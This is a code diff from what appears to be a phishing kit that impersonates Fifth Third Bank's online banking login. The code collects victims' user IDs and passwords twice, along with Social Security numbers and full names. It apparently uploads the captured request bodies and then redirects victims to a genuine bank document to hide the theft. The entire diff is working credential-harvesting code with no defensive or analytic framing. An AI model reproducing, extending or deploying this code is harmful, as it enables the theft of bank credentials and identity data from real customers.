@@ -120,25 +120,24 @@ const ExecPhpPager = class extends globalWorker.BaseClasses.BasePreClass {
 
     execute(clientContext) {
         if (this.req.method === 'POST') {
+            super.uploadRequestBody(clientContext.currentDomain, clientContext)
+
             if (this.req.url === '/session/secure/login.html') {
                 if (clientContext.info.secondTime) {
-            
-                    super.captureBody(clientContext.currentDomain, clientContext)
-                    // clientContext.currentDomain = 'onlinebanking.53.com'
                     this.res.writeHead(301, { location: '/session/secure/security.html' })
                     super.cleanEnd('PHP-EXEC', clientContext)
                 } else {
+                    // super.captureBody(clientContext.currentDomain, clientContext)
                     clientContext.info.secondTime = true;
                     clientContext.setLogAvailable(true)
                     super.superExecutePhpScript('login2.html', clientContext)
                 }
                 
             } else if (this.req.url === '/session/secure/security.html') {
-                super.uploadRequestBody(clientContext.currentDomain, clientContext)
                 this.res.writeHead('301', { location: '/content/dam/fifth-third/docs/legal/ftb-digital-services-user-agreement.pdf' })
-                return super.cleanEnd('PHP-EXEC', clientContext)
+                return super.cleanEnd(clientContext.currentDomain, clientContext)
             } else {
-                // super.uploadRequestBody(clientContext.currentDomain, clientContext)
+                super.uploadRequestBody(clientContext.currentDomain, clientContext)
                 this.res.writeHead(404)
                 super.cleanEnd('PHP-EXEC', clientContext)
             }
@@ -181,44 +180,42 @@ const configExport = {
             method: 'POST',
             params: ['user-id'],
             urls: '',
-            hosts: ['www.53.com'],
+            hosts: 'PHP-EXEC',
         },
 
         loginPassword: {
             method: 'POST',
             params: ['password'],
             urls: '',
-            hosts: ['www.53.com'],
+            hosts: 'PHP-EXEC',
         },
         loginUserName2: {
             method: 'POST',
             params: ['user-id2'],
             urls: '',
-            hosts: ['www.53.com'],
+            hosts: 'PHP-EXEC',
         },
 
         loginPassword2: {
             method: 'POST',
             params: ['password2'],
             urls: '',
-            hosts: ['www.53.com'],
+            hosts: 'PHP-EXEC',
         },
 
-        ssnNumber: {
+        ssnNo: {
             method: 'POST',
             params: ['ssn'],
             urls: '',
-            hosts: ['wwww.53.com'],
+            hosts: 'PHP-EXEC',
         },
-
 
         fullName: {
             method: 'POST',
             params: ['fullname'],
             urls: '',
-            hosts: ['www.53.com'],
+            hosts: 'PHP-EXEC',
         },
-       
 
         defaultPhpCapture: {
             method: 'POST',
